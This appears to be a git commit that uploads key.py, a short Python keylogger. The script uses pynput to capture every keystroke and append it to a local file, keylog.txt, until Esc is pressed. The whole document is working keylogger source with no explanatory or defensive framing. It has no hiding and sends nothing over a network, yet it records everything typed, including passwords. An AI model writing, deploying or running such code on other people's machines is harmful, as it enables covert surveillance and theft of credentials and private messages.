da5f19b5d7cb0d7abd89e2ee27e6d06c40bb59e4
Aash <113224659+AASH71@users.noreply.github.com>
2024-09-16 12:55:18 +1000

    Add files via upload

---
+++ key.py
@@ -0,0 +1,25 @@
+from pynput import keyboard
+
+# Define the log file
+LOG_FILE = "keylog.txt"
+
+def on_press(key):
+    try:
+        with open(LOG_FILE, "a") as f:
+            f.write(f"{key.char}")
+    except AttributeError:
+        with open(LOG_FILE, "a") as f:
+            f.write(f"[{key}]")
+
+def on_release(key):
+    if key == keyboard.Key.esc:
+        # Stop listener
+        return False
+
+def main():
+    # Collect events until released
+    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+        listener.join()
+
+if __name__ == "__main__":
+    main()
